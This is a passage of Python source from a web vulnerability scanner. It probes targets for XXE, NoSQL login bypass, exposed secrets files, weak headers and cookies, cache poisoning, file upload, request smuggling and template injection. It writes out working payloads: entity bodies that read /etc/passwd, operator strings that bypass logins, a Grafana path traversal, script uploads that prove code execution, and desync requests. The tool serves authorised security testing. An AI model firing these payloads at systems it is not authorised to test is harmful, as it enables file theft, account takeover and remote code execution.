"""Focused vuln checks (XXE, NoSQL, upload, smuggling, cache poison, headers, misc).

Extracted from web.py. Every entry is re-exported through
web/__init__.py's wildcard import so `from recce.services.web import X`
keeps working for the split names too."""
from __future__ import annotations

import base64
import difflib
import hashlib
import hmac
import http.client
import json
import re
import socket
import ssl
import time
from urllib.parse import quote, urlencode, urljoin, urlparse

from ...models import Host, Port, Vuln
from ... import probes, proxy


# Shared primitives — every probe fetches through _fetch / _mk / etc.
from .http import *  # noqa: F401,F403
from .crawl import *  # noqa: F401,F403
from .auth import *  # noqa: F401,F403

__all__ = ['_XXE_LINUX', '_XXE_WIN', '_XXE_HIT', '_XXE_PATHS', '_scan_xxe', '_scan_nosql', '_PATHS', '_DANGEROUS_METHODS', '_SESSION_COOKIE', '_security_headers', '_TAKEOVER', '_takeover_service', '_takeover_finding', '_csp_findings', '_cookie_findings', '_prove_put', '_CACHE_HDRS', '_CACHEABLE', '_cacheable', '_scan_cache_poison', '_UPLOAD_DIRS', '_UPLOAD_ENGINES', '_find_upload_forms', '_scan_upload', '_raw_exchange', '_scan_smuggle', '_scan_reflection', '_WP_PLUGINS', '_scan_wordpress', '_check_prototype_pollution', '_check_ldap_injection', '_check_header_injection', '_check_method_override', '_check_admin_panels', '_check_race_condition', '_check_dom_xss', '_check_type_confusion', '_check_rate_limits', '_PASSWD_RE', '_check_null_byte_injection', '_check_bot_detection_bypass']


_XXE_LINUX = ('<?xml version="1.0"?>\n'
              '<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
              '<recce>&xxe;</recce>')


_XXE_WIN = ('<?xml version="1.0"?>\n'
            '<!DOCTYPE recce [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
            '<recce>&xxe;</recce>')


_XXE_HIT = re.compile(r"root:.*:0:0:|\[fonts\]|for 16-bit app support|\[extensions\]")


_XXE_PATHS = ["/", "/api", "/api/xml", "/xmlrpc.php", "/services", "/soap", "/ws",
              "/rest", "/upload", "/import"]




def _scan_xxe(ip: str, port: Port, base: str, auth) -> list[Vuln]:
    """XML External Entity file read. POSTs an external-entity XML body to likely XML
    endpoints; flags only when the referenced file's content comes back (zero-FP)."""
    probes = [(p, _XXE_LINUX) for p in _XXE_PATHS]
    probes += [("/", _XXE_WIN), ("/api", _XXE_WIN)]        # Windows variant, root + /api
    for path, payload in probes:
        extra = dict(auth or {})
        extra["Content-Type"] = "application/xml"
        r = _fetch(ip, port, path, method="POST", body=payload, auth=extra)
        if r and r[2] and _XXE_HIT.search(r[2]):
            what = "/etc/passwd" if "root:" in r[2] else "C:\\windows\\win.ini"
            return [_mk(ip, port, "web-xxe", "critical",
                        f"XML External Entity (XXE) file read via {path}", ["CWE-611"],
                        f"POST {base}{path} with an external-entity XML body returned "
                        f"{what} content - the XML parser resolves external entities "
                        "(arbitrary file read; also an SSRF + billion-laughs DoS surface).",
                        "Disable DTDs / external entities in the XML parser "
                        "(FEATURE_SECURE_PROCESSING, disallow-doctype-decl).",
                        confidence="confirmed")]
    return []




def _scan_nosql(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    """NoSQL (MongoDB-style) authentication bypass: submit operator payloads to the
    login form and confirm a login the wrong-credential baseline didn't get. A few
    login POSTs, lockout-aware; self-skips when there's no login form."""
    form, action = _find_login_form(ip, port, body, auth)
    if not form:
        return []
    userf, passf = _login_fields(form)
    if not userf or not passf:
        return []
    hidden = form.get("values") or {}

    def _urlenc(data):
        return _fetch(ip, port, action, method="POST", body=urlencode(data),
                      auth={"Content-Type": "application/x-www-form-urlencoded"})

    def _win(r):
        return bool(r) and (r[0] in (301, 302, 303) or not _looks_logged_out(r))

    bad = _urlenc({**hidden, userf: "recce_zz_u", passf: "recce_zz_p"})
    if not _looks_logged_out(bad):        # can't tell a login apart -> don't guess (FP guard)
        return []

    def mk(kind, detail):
        return [_mk(ip, port, "web-nosqli", "critical",
                    f"NoSQL injection authentication bypass ({kind})", ["CWE-943", "CWE-287"],
                    detail, "Cast auth inputs to strings; reject operator objects; validate "
                    "types server-side (schema/whitelist).", confidence="confirmed")]

    # 1) bracket/array operator (Express/PHP query-string parsers -> object).
    for op, val in (("$ne", "recce"), ("$gt", "")):
        r = _urlenc({**hidden, f"{userf}[{op}]": val, f"{passf}[{op}]": val})
        if _win(r):
            return mk("operator injection",
                      f"POST {base}{action} with {userf}[{op}]={val!r} & {passf}[{op}]="
                      f"{val!r} logged in with no valid credentials - bracket-parsed input "
                      "reaches a NoSQL query operator.")
    # 2) JSON operator body.
    r = _fetch(ip, port, action, method="POST",
               body=json.dumps({**hidden, userf: {"$ne": None}, passf: {"$ne": None}}),
               auth={"Content-Type": "application/json"})
    if _win(r):
        return mk("JSON operator injection",
                  f"POST {base}{action} with a JSON body {{{userf}:{{$ne:null}}, "
                  f"{passf}:{{$ne:null}}}} logged in with no valid credentials.")
    return []


_PATHS = [
    (".git/HEAD", "high", "web-git", "Exposed Git repository (.git) - source/secret disclosure",
     ["CWE-538"], "Deny access to .git and remove it from the web root.",
     lambda s, b: s == 200 and b.strip().startswith("ref:")),
    (".git/config", "high", "web-gitconfig", "Exposed .git/config (remote URL - may embed credentials)",
     ["CWE-538"], "Deny access to .git and remove it from the web root.",
     lambda s, b: s == 200 and "[core]" in b),
    (".env", "high", "web-dotenv", "Exposed .env file (app secrets / DB credentials)",
     ["CWE-538", "CWE-215"], "Move .env outside the web root; deny access.",
     lambda s, b: s == 200 and re.search(r"APP_KEY|DB_(PASSWORD|HOST|USER)|SECRET|API_?KEY", b, re.I)),
    (".svn/entries", "medium", "web-svn", "Exposed SVN metadata (.svn)",
     ["CWE-538"], "Remove .svn from the web root.",
     lambda s, b: s == 200 and b.split("\n", 1)[0].strip().isdigit()),
    ("server-status", "medium", "web-serverstatus", "Apache mod_status exposed (/server-status)",
     ["CWE-200"], "Restrict <Location /server-status> to localhost/admins.",
     lambda s, b: s == 200 and "Apache Server Status" in b),
    ("phpinfo.php", "medium", "web-phpinfo", "phpinfo() page exposed",
     ["CWE-200"], "Remove phpinfo() pages from production.",
     lambda s, b: s == 200 and "phpinfo()" in b.lower()),
    ("info.php", "medium", "web-phpinfo", "phpinfo() page exposed",
     ["CWE-200"], "Remove phpinfo() pages from production.",
     lambda s, b: s == 200 and "phpinfo()" in b.lower()),
    ("web.config", "medium", "web-webconfig", "IIS web.config readable",
     ["CWE-538"], "Deny direct access to web.config.",
     lambda s, b: s == 200 and "<configuration" in b.lower()),
    ("swagger.json", "info", "web-swagger", "API schema exposed (Swagger/OpenAPI)",
     ["CWE-200"], "Restrict API schema exposure if not intended public.",
     lambda s, b: s == 200 and ('"swagger"' in b or '"openapi"' in b)),
    ("manager/html", "medium", "web-tomcat-manager", "Apache Tomcat Manager reachable",
     ["CWE-1188"], "Restrict/authenticate the Tomcat Manager app.",
     # A bare 200/401/403 matched EVERY auth-gated or default-deny server (nginx 403,
     # site-wide basic auth) as "Tomcat Manager". Require a Tomcat signature: its own
     # manager app (200) and its default 401/403 error pages are branded "Apache
     # Tomcat", so a generic 401/403 from something else no longer qualifies.
     lambda s, b: s in (200, 401, 403) and "tomcat" in b.lower()),
    ("wp-login.php", "info", "web-wordpress", "WordPress login page (WordPress in use)",
     ["CWE-200"], "Ensure WordPress + plugins are current; restrict wp-login/xmlrpc.",
     lambda s, b: s == 200 and ("user_login" in b or "wordpress" in b.lower())),
    ("robots.txt", "info", "web-robots", "robots.txt discloses paths",
     ["CWE-200"], "Review Disallow entries (they hint at sensitive paths).",
     lambda s, b: s == 200 and "disallow" in b.lower()),
    # --- high-value exposures --------------------------------------------------
    (".DS_Store", "low", "web-dsstore", "Exposed .DS_Store (directory structure disclosure)",
     ["CWE-548"], "Remove .DS_Store from the web root; deny dotfiles.",
     lambda s, b: s == 200 and "Bud1" in b[:16]),
    ("crossdomain.xml", "medium", "web-crossdomain",
     "Permissive crossdomain.xml (wildcard allow-access-from)",
     ["CWE-942"], "Remove the wildcard; restrict allow-access-from to trusted domains.",
     lambda s, b: s == 200 and "cross-domain-policy" in b
     and bool(re.search(r'allow-access-from[^>]*domain="\*"', b))),
    ("metrics", "medium", "web-metrics", "Prometheus /metrics endpoint exposed",
     ["CWE-200"], "Restrict /metrics to the scraper - it leaks internal metrics/paths.",
     lambda s, b: s == 200 and ("# HELP" in b or "# TYPE" in b)),
    (".htpasswd", "high", "web-htpasswd", "Exposed .htpasswd (password hashes)",
     ["CWE-538"], "Deny access to .ht* files in the web server config.",
     lambda s, b: s == 200 and bool(re.search(r":\$(apr1|2[aby]|1|5|6)\$|:\{SHA\}", b))),
    ("server-info", "medium", "web-serverinfo", "Apache mod_info exposed (/server-info)",
     ["CWE-200"], "Restrict <Location /server-info> to localhost/admins.",
     lambda s, b: s == 200 and "Apache Server Information" in b),
    (".aws/credentials", "high", "web-aws", "Exposed AWS credentials file",
     ["CWE-538"], "Remove cloud creds from the web root and rotate them.",
     lambda s, b: s == 200 and "aws_access_key_id" in b.lower()),
    ("wp-json/wp/v2/users", "low", "web-wpusers", "WordPress user enumeration via REST API",
     ["CWE-200"], "Restrict the users REST endpoint / disable REST user listing.",
     lambda s, b: s == 200 and '"slug"' in b and b.lstrip().startswith("[")),
    # --- niche application exposures (tier 1) ----------------------------------
    ("script", "critical", "web-jenkins-script",
     "Jenkins Script Console reachable unauthenticated (Groovy RCE)",
     ["CWE-284", "CWE-94"],
     "Enable Jenkins security + matrix auth; never expose /script anonymously.",
     lambda s, b: s == 200 and ("Script Console" in b or "Jenkins.instance" in b
                                or 'name="script"' in b)),
    ("admin/master/console/", "medium", "web-keycloak-console",
     "Keycloak admin console reachable",
     ["CWE-284"],
     "Restrict the admin console to trusted networks / behind a VPN.",
     lambda s, b: s == 200 and ("Keycloak Administration" in b or "kc-context" in b
                                or "authServerUrl" in b or "adminBaseUrl" in b)),
    ("public/plugins/alertlist/../../../../../../../../etc/passwd", "high",
     "web-grafana-lfi",
     "Grafana plugin path traversal - arbitrary file read (CVE-2021-43798)",
     ["CWE-22"],
     "Upgrade Grafana to >= 8.3.1; restrict the plugin routes.",
     lambda s, b: s == 200 and bool(re.search(r"root:.*:0:0:", b))),
    ("v1/sys/seal-status", "low", "web-vault-status",
     "HashiCorp Vault reachable (seal status / version readable)",
     ["CWE-200"],
     "Restrict the Vault API to trusted clients; keep audit + auth enforced.",
     lambda s, b: s == 200 and '"sealed"' in b and '"version"' in b),
    ("_cat/indices?format=json", "high", "web-elastic-open",
     "Elasticsearch readable without authentication (data exposure)",
     ["CWE-306", "CWE-284"],
     "Enable the security realm (authentication) and bind to a trusted interface.",
     lambda s, b: s == 200 and b.lstrip()[:1] == "["
     and ('"health"' in b or '"index"' in b)),
    ("api/status", "info", "web-kibana",
     "Kibana status endpoint exposed (version disclosure)",
     ["CWE-200"],
     "Restrict Kibana; keep it patched (the version maps to known CVEs).",
     lambda s, b: s == 200 and '"version"' in b and "kibana" in b.lower()),
]



_DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}


_SESSION_COOKIE = re.compile(r"sess|sid|auth|token|jwt|remember|login|sso|csrf", re.I)




def _security_headers(ip: str, port: Port, headers: dict) -> list[Vuln]:
    """Consolidated audit of the root response's security headers. One finding listing
    every missing header; severity rises when a high-impact one (CSP / clickjacking /
    HSTS-on-TLS) is absent."""
    if not headers:
        return []
    missing: list[str] = []
    high = False
    csp = headers.get("content-security-policy", "")
    if not csp:
        missing.append("Content-Security-Policy")
        high = True
    if not headers.get("x-frame-options") and "frame-ancestors" not in csp.lower():
        missing.append("X-Frame-Options / CSP frame-ancestors (clickjacking)")
        high = True
    if "nosniff" not in headers.get("x-content-type-options", "").lower():
        missing.append("X-Content-Type-Options: nosniff")
    if not headers.get("referrer-policy"):
        missing.append("Referrer-Policy")
    if probes._is_tls(port) and not headers.get("strict-transport-security"):
        missing.append("Strict-Transport-Security (HSTS)")
        high = True
    if not headers.get("permissions-policy"):
        missing.append("Permissions-Policy")
    if not missing:
        return []
    return [_mk(ip, port, "web-security-headers", "medium" if high else "low",
                "Missing security response headers", ["CWE-693"],
                "The root response omits: " + "; ".join(missing) + ".",
                "Set the missing headers: Content-Security-Policy, X-Frame-Options (or CSP "
                "frame-ancestors), Strict-Transport-Security on TLS, X-Content-Type-Options: "
                "nosniff, Referrer-Policy, Permissions-Policy.")]


_TAKEOVER = [
    ("AWS S3", re.compile(r"NoSuchBucket|The specified bucket does not exist")),
    ("GitHub Pages", re.compile(r"There isn't a GitHub Pages site here|"
                                r"For root URLs \(like http://example\.com/\)")),
    ("Heroku", re.compile(r"No such app|herokucdn\.com/error-pages/no-such-app")),
    ("Fastly", re.compile(r"Fastly error: unknown domain")),
    ("Shopify", re.compile(r"Sorry, this shop is currently unavailable")),
    ("Tumblr", re.compile(r"Whatever you were looking for doesn't currently exist at "
                          r"this address")),
    ("Bitbucket", re.compile(r"Repository not found")),
    ("Ghost", re.compile(r"The thing you were looking for is no longer here")),
    ("Surge.sh", re.compile(r"project not found")),
    ("Pantheon", re.compile(r"The gods are wise, but do not know of the site which you seek")),
    ("Azure", re.compile(r"404 Web Site not found|azurewebsites")),
    ("Netlify", re.compile(r"Not Found - Request ID")),
    ("Zendesk", re.compile(r"Help Center Closed")),
    ("Read the Docs", re.compile(r"unknown to Read the Docs")),
    ("Cargo", re.compile(r"<title>404 &mdash; File not found</title>.*cargo", re.S)),
]




def _takeover_service(body: str) -> str:
    if not body:
        return ""
    head = body[:8000]
    for svc, rx in _TAKEOVER:
        if rx.search(head):
            return svc
    return ""




def _takeover_finding(ip: str, port: Port, base: str, host: str, service: str) -> Vuln:
    return _mk(ip, port, "web-takeover", "high",
               f"Potential subdomain takeover ({service})", ["CWE-16"],
               f"{host or base} served the {service} 'unclaimed resource' error page - the "
               f"DNS record points at {service} but the resource isn't claimed, so an "
               "attacker can register it and serve arbitrary content on this domain "
               "(phishing, cookie theft, OAuth-redirect abuse).",
               f"Remove the dangling DNS record, or (re)claim the {service} resource it "
               "points to.", confidence="confirmed")




def _csp_findings(ip: str, port: Port, headers: dict) -> list[Vuln]:
    """Analyse a PRESENT Content-Security-Policy for bypasses (a missing CSP is handled
    by the security-headers audit). A weak CSP doesn't stop the XSS it's meant to."""
    csp = headers.get("content-security-policy", "")
    if not csp:
        return []
    low = csp.lower()
    m = re.search(r"script-src\s+([^;]*)", low) or re.search(r"default-src\s+([^;]*)", low)
    script_src = m.group(1) if m else ""
    weak: list[str] = []
    high = False
    if "'unsafe-inline'" in script_src or ("'unsafe-inline'" in low and not m):
        weak.append("'unsafe-inline' in script-src (inline-script XSS is not blocked)")
        high = True
    if "'unsafe-eval'" in low:
        weak.append("'unsafe-eval' (eval()-based script execution allowed)")
    if re.search(r"(^|\s)\*(\s|$)", script_src) or "http:" in script_src \
            or "data:" in script_src or script_src.strip() in ("https:", "*"):
        weak.append("a wildcard / scheme source in script-src (any-origin script load)")
        high = True
    if "object-src" not in low:
        weak.append("no object-src 'none' (plugin/embed XSS vector)")
    if "base-uri" not in low:
        weak.append("no base-uri (a <base> tag can hijack relative script URLs)")
    if not weak:
        return []
    return [_mk(ip, port, "web-csp", "medium" if high else "low",
                "Weak Content-Security-Policy (bypassable)", ["CWE-693"],
                "The CSP is present but weak: " + "; ".join(weak) + ".",
                "Drop 'unsafe-inline'/'unsafe-eval' (use nonces/hashes), remove wildcard/"
                "scheme sources, and set object-src 'none' + base-uri 'self'.")]




def _cookie_findings(ip: str, port: Port, set_cookie_blob: str) -> list[Vuln]:
    """Per-cookie hygiene from the Set-Cookie header(s): HttpOnly, Secure, SameSite,
    __Host-/__Secure- prefix, cleartext-session transport, and over-broad Domain scope.
    Deduped by (cookie name, issue) so many cookies don't spam identical findings."""
    out: list[Vuln] = []
    if not set_cookie_blob:
        return out
    tls = probes._is_tls(port)
    seen: set = set()

    for line in set_cookie_blob.split("\n"):
        line = line.strip()
        if not line or "=" not in line:
            continue
        name = line.split("=", 1)[0].strip()
        low = line.lower()
        session = bool(_SESSION_COOKIE.search(name))

        def add(sev, title, cwes, fix):
            if (name, title) in seen:
                return
            seen.add((name, title))
            out.append(_mk(ip, port, "web-cookie", sev, f"{title}: {name}", cwes,
                           f"Set-Cookie: {line[:140]}", fix))

        if "httponly" not in low:
            add("low", "Cookie without HttpOnly", ["CWE-1004"],
                "Set HttpOnly so client-side JavaScript cannot read the cookie.")
        if tls and "secure" not in low:
            add("low", "Cookie without Secure (served over HTTPS)", ["CWE-614"],
                "Set the Secure flag so the cookie is only sent over HTTPS.")
        if "samesite" not in low:
            add("low", "Cookie without SameSite (CSRF / cross-site surface)",
                ["CWE-1275"], "Set SameSite=Lax (or Strict) to limit cross-site sending.")
        elif "samesite=none" in low and "secure" not in low:
            add("medium", "Cookie SameSite=None without Secure", ["CWE-1275"],
                "SameSite=None requires the Secure attribute; browsers reject it otherwise.")
        if session and not tls:
            add("medium", "Session cookie set over cleartext HTTP (token exposed on the wire)",
                ["CWE-319"], "Serve authentication over HTTPS + HSTS.")
        if session and not (name.startswith("__Host-") or name.startswith("__Secure-")):
            add("info", "Session cookie without __Host-/__Secure- prefix", ["CWE-1275"],
                "Prefix session cookies with __Host- to pin host + Secure + Path=/.")
        if re.search(r"domain=(\.[^;]+)", low):
            add("low", "Cookie scoped to a broad parent Domain", ["CWE-1275"],
                "Drop the leading-dot Domain; scope cookies to the exact host.")
    return out




def _prove_put(ip: str, port: Port, auth: dict | None):
    """Non-destructively prove HTTP PUT write: upload a unique marker file, read it
    back, then DELETE it. Returns (True, evidence) if it round-trips, (False, note) if
    PUT is advertised but rejected/unreadable, or None if the request failed."""
    name = "recce_put_probe.txt"
    marker = "recce-put-write-proof"
    put = _fetch(ip, port, "/" + name, method="PUT", body=marker, auth=auth)
    if not put:
        return None
    if put[0] not in (200, 201, 204):
        return False, f"PUT /{name} returned HTTP {put[0]} (advertised but not accepted)."
    got = _fetch(ip, port, "/" + name, method="GET", auth=auth)
    round_trips = bool(got and got[0] == 200 and marker in (got[2] or ""))
    _fetch(ip, port, "/" + name, method="DELETE", auth=auth)         # best-effort cleanup
    if round_trips:
        return True, (f"PUT /{name} -> HTTP {put[0]}; GET /{name} returned the uploaded "
                      f"marker '{marker}' -> arbitrary file write CONFIRMED "
                      "(probe file removed via DELETE).")
    return False, f"PUT /{name} returned {put[0]} but the file was not readable back."




_CACHE_HDRS = ("x-forwarded-host", "x-forwarded-scheme", "x-host", "x-forwarded-server",
               "x-original-url", "x-rewrite-url")


_CACHEABLE = re.compile(r"public|max-age=[1-9]|s-maxage=[1-9]", re.I)




def _cacheable(headers: dict) -> str:
    """Return a short reason the response looks cacheable, else ''. Requires a positive
    cache signal (a proxy cache header, or Cache-Control that permits shared caching)
    and no store-blocking directive - keeps the poison finding low-FP."""
    cc = headers.get("cache-control", "").lower()
    if "no-store" in cc or "private" in cc:
        return ""
    for h in ("x-cache", "cf-cache-status", "age", "x-cache-hits", "x-varnish"):
        if h in headers:
            return f"{h}: {headers[h]}"
    if _CACHEABLE.search(cc):
        return f"cache-control: {headers['cache-control']}"
    return ""




def _scan_cache_poison(ip: str, port: Port, auth) -> list[Vuln]:
    """Unkeyed-header cache poisoning: does an X-Forwarded-Host (etc.) value reflect
    into a CACHEABLE response? Reflection + cacheability = a poisonable cache entry
    (we detect, we do not actually poison). One extra request per candidate header."""
    marker = "recce-cachepoison.example"
    out: list[Vuln] = []
    for h in _CACHE_HDRS:
        r = _fetch(ip, port, "/", auth={**(auth or {}), h.title(): marker})
        if not r:
            continue
        st, hd, bd = r
        if st >= 500:
            continue
        loc = hd.get("location", "")
        reflected = marker in bd or marker in loc
        if not reflected:
            continue
        reason = _cacheable(hd)
        if not reason:
            continue
        where = "Location redirect" if marker in loc else "response body (absolute URL/link)"
        out.append(_mk(ip, port, "web-cache-poison", "high",
            "Web cache poisoning via unkeyed header", ["CWE-349"],
            f"{h}: {marker} was reflected into the {where} AND the response is cacheable "
            f"({reason}). The header is not part of the cache key, so a poisoned entry is "
            "served to every subsequent visitor (redirect hijack / stored-XSS delivery).",
            "Include the header in the cache key or strip it at the edge; never reflect "
            "Host-family headers into responses."))
        break                                  # one proof of the class is enough
    return out




_UPLOAD_DIRS = ("uploads", "upload", "files", "file", "images", "img", "media",
                "assets", "data", "tmp", "static")


_UPLOAD_ENGINES = [
    ("php", "<?php echo '{tag}'.(7*7);?>", "PHP"),
    ("phtml", "<?php echo '{tag}'.(7*7);?>", "PHP"),
    ("php5", "<?php echo '{tag}'.(7*7);?>", "PHP"),
    ("pht", "<?php echo '{tag}'.(7*7);?>", "PHP"),
    ("jsp", "<% out.print(\"{tag}\"+(7*7)); %>", "JSP"),
    ("asp", "<% Response.Write(\"{tag}\"&(7*7)) %>", "ASP"),
]




def _find_upload_forms(body: str, base_path: str) -> list[dict]:
    """Multipart forms that carry a file input: {action, file_field, hidden{}}."""
    out = []
    for fm in _FORM_RE.findall(body or ""):
        if "multipart/form-data" not in fm.lower():
            continue
        file_field = ""
        hidden: dict = {}
        for inp in _INPUT_RE.findall(fm):
            nm = _NAME_RE.search(inp)
            tm = _ITYPE_RE.search(inp)
            name = nm.group(1) if nm else ""
            itype = (tm.group(1).lower() if tm else "text")
            if not name:
                continue
            if itype == "file" and not file_field:
                file_field = name
            elif itype == "hidden":
                vm = re.search(r'value\s*=\s*["\']?([^"\'>\s]*)', inp, re.I)
                hidden[name] = vm.group(1) if vm else ""
        if file_field:
            am = _ACTION_RE.search(fm)
            out.append({"action": am.group(1) if am else base_path,
                        "file_field": file_field, "hidden": hidden})
    return out




def _scan_upload(ip: str, port: Port, base: str, body: str, auth,
                 prove: bool) -> list[Vuln]:
    """File-upload attack surface. Always emits a low lead when a multipart upload form
    is present. Under --upload-shell (`prove`) it uploads a benign server-computed-marker
    payload and fetches it back: a computed marker in the response CONFIRMS code
    execution (RCE); a verbatim-but-served copy is unrestricted storage. Leaves the
    uploaded file's path in the finding for cleanup."""
    forms = _find_upload_forms(body, "/")
    if not forms:
        return []
    out: list[Vuln] = []
    out.append(_mk(ip, port, "web-upload-form", "low",
        "File-upload form present", ["CWE-434"],
        f"A multipart/form-data upload form (file field '{forms[0]['file_field']}', action "
        f"'{forms[0]['action']}') is exposed. Re-run `recce web --upload-shell` to actively "
        "test whether a script can be uploaded and executed.",
        "Validate type/extension server-side, store outside the web root, and serve via a "
        "non-executing handler.", confidence="potential"))
    if not prove:
        return out
    tag = "recceUP" + hashlib.sha1(f"{ip}:{port.portid}".encode()).hexdigest()[:8]
    marker = tag + "49"                          # tag + (7*7), computed by the server
    for form in forms[:2]:
        action = urljoin(base + "/", form["action"])
        act_path = urlparse(action).path or "/"
        act_dir = act_path.rsplit("/", 1)[0]
        for ext, tmpl, engine in _UPLOAD_ENGINES:
            fn = f"{tag}.{ext}"
            payload = tmpl.format(tag=tag).encode()
            resp = _post_multipart(ip, port, act_path, form["hidden"], form["file_field"],
                                   fn, payload, auth=auth)
            if resp is None:
                continue
            # Candidate stored URLs: any path echoed in the response that names our file,
            # plus the usual upload dirs and the form's own directory.
            cands: list[str] = []
            for m in re.finditer(re.escape(fn), resp[2]):
                seg = resp[2][max(0, m.start() - 120):m.start() + len(fn)]
                pm = re.search(r'(/[\w./\-]*%s)' % re.escape(fn), seg)
                if pm:
                    cands.append(pm.group(1))
            for d in _UPLOAD_DIRS:
                cands.append(f"/{d}/{fn}")
            cands.append(f"{act_dir}/{fn}")
            seen_c: set = set()
            for c in cands:
                if c in seen_c:
                    continue
                seen_c.add(c)
                got = _fetch(ip, port, c, auth=auth)
                if not got or got[0] != 200:
                    continue
                gb = got[2]
                if marker in gb and "<?php" not in gb and tmpl.split("{tag}")[0] not in gb:
                    out.append(_mk(ip, port, "web-upload-rce", "critical",
                        f"Unrestricted file upload to {engine} code execution", ["CWE-434"],
                        f"Uploaded {fn} via '{form['file_field']}' and GET {base}{c} returned the "
                        f"SERVER-COMPUTED marker '{marker}' (payload echoed tag + 7*7) - the "
                        f"{engine} was executed, not served as source. Remote code execution.",
                        f"Delete {c}. Validate type server-side, store outside the web root, "
                        "serve uploads via a non-executing path.", confidence="confirmed"))
                    return out
                if fn in gb or (tag in gb):        # stored + retrievable, not executed
                    out.append(_mk(ip, port, "web-upload", "medium",
                        "Unrestricted file upload (stored and retrievable)", ["CWE-434"],
                        f"Uploaded {fn} and retrieved it at {base}{c} (HTTP 200) - the server "
                        "stored an attacker-named file in a web-reachable path without "
                        "executing it. With a matching handler (or a different extension) this "
                        "is a webshell foothold.",
                        f"Delete {c}. Enforce an allow-list of types, randomise stored names, "
                        "and store outside the web root.", confidence="confirmed"))
                    return out
    return out




def _raw_exchange(ip: str, port: Port, raw: bytes, timeout: float) -> float:
    """Send raw bytes on a fresh socket and return seconds until the first response byte
    (or `timeout` if none arrives). Used only by the opt-in smuggling probe."""
    s = None
    try:
        s = socket.create_connection((ip, port.portid), timeout=timeout)
        if probes._is_tls(port):
            s = ssl._create_unverified_context().wrap_socket(s, server_hostname=ip)
        s.sendall(raw)
        s.settimeout(timeout)
        t0 = time.monotonic()
        try:
            s.recv(1)
        except (socket.timeout, TimeoutError):
            return timeout
        return time.monotonic() - t0
    except OSError:
        return -1.0
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass




def _scan_smuggle(ip: str, port: Port, timeout: float = 6.0) -> list[Vuln]:
    """CL.TE / TE.CL request-smuggling detection by timing. A vulnerable front/back
    disagreement makes one side wait for a chunk/body that never arrives, so the probe
    stalls near the socket timeout while a well-formed control returns immediately. We
    only send an incomplete body (never a smuggled second request), so nothing is
    queued against another user. Opt-in (--smuggle) - can still disturb fragile proxies."""
    host = f"{ip}:{port.portid}"
    to = timeout
    # Control: a well-formed keep-alive request must come back fast, or the host is just
    # slow and any "delay" below would be a false positive.
    ctrl = (f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    base_t = min(t for t in (_raw_exchange(ip, port, ctrl, to) for _ in range(2)))
    if base_t < 0 or base_t > 2.0:
        return []                                 # unreachable or slow: don't guess
    probes_ = {
        "CL.TE": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\n"
                  f"Transfer-Encoding: chunked\r\n\r\n1\r\nA\r\nX").encode(),
        "TE.CL": (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\n"
                  f"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nX").encode(),
    }
    out: list[Vuln] = []
    for name, raw in probes_.items():
        d1 = _raw_exchange(ip, port, raw, to)
        if d1 < to - 1.0:
            continue                              # no stall -> not this variant
        d2 = _raw_exchange(ip, port, raw, to)     # confirm the stall reproduces
        if d2 < to - 1.0:
            continue
        out.append(_mk(ip, port, "web-smuggle", "high",
            f"HTTP request smuggling ({name} desync, timing)", ["CWE-444"],
            f"A {name} probe (Content-Length + Transfer-Encoding disagreement) stalled the "
            f"connection to ~{to:.0f}s on two tries while a well-formed request returned in "
            f"{base_t:.2f}s - the front-end and back-end parse the body length differently "
            "(classic desync signal). recce sent only an incomplete body, never a smuggled "
            "second request.",
            "Reject requests bearing both Content-Length and Transfer-Encoding; make the "
            "front-end normalise/route on a single, consistent framing.",
            confidence="potential"))
        break                                     # one confirmed direction is enough
    return out




def _scan_reflection(ip: str, port: Port, base: str, auth) -> list[Vuln]:
    # One request. {{7*7}} / ${7*7} / <%=7*7%> evaluating to 49 near our canary is a
    # strong, low-false-positive SSTI signal; an unencoded <i> reflection is an
    # XSS lead to verify. Injected into a throwaway param - non-destructive.
    payload = "recceA{{7*7}}recceB${7*7}recceC<%=7*7%>recceD<i>"
    r = _fetch(ip, port, "/?rc=" + quote(payload), auth=auth)
    if not r or r[0] >= 500 or not r[2]:
        return []
    b = r[2]
    out: list[Vuln] = []
    if "recceA49" in b or "recceB49" in b or "recceC49" in b:
        def _probe(p):
            rr = _fetch(ip, port, "/?rc=" + quote(p), auth=auth)
            return rr[2] if rr else ""
        engine, rce = _ssti_identify(_probe)
        out.append(_ssti_finding(ip, port, f"GET {base}/?rc=", engine, rce))
    elif "recceD<i>" in b:
        out.append(_mk(ip, port, "web-reflected", "medium",
                       "Input reflected unencoded (reflected-XSS lead)", ["CWE-79"],
                       f"GET {base}/?rc=…<i> reflected the '<i>' unencoded -> verify for reflected XSS.",
                       "Context-encode all reflected user input.", confidence="potential"))
    return out


_WP_PLUGINS = ["contact-form-7", "woocommerce", "elementor", "wordpress-seo", "wordfence",
               "akismet", "jetpack", "wpforms-lite", "revslider", "wp-file-manager",
               "duplicator", "all-in-one-wp-migration"]




def _scan_wordpress(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    # Core version from the generator meta or /readme.html.
    ver = ""
    m = re.search(r"WordPress\s+([\d.]+)", body)
    if not m:
        rd = _fetch(ip, port, "/readme.html", auth=auth)
        if rd and rd[0] == 200:
            m = re.search(r"[Vv]ersion\s+([\d.]+)", rd[2])
    if m:
        ver = m.group(1)
        out.append(_mk(ip, port, "web-wp-version", "info",
                       f"WordPress {ver} detected", ["CWE-1104"],
                       f"WordPress core version {ver} (check for known core CVEs; run wpscan).",
                       "Keep WordPress core current."))
    # XML-RPC (brute-force / amplification surface).
    x = _fetch(ip, port, "/xmlrpc.php", method="POST", body="<methodCall></methodCall>", auth=auth)
    if x and x[0] in (200, 405) and "xml" in x[1].get("content-type", "").lower():
        out.append(_mk(ip, port, "web-wp-xmlrpc", "low",
                       "WordPress XML-RPC enabled", ["CWE-799"],
                       f"{base}/xmlrpc.php is enabled (password brute-force + pingback amplification).",
                       "Disable xmlrpc.php if unused."))
    # Installed plugins + their version (readme Stable tag).
    for slug in _WP_PLUGINS:
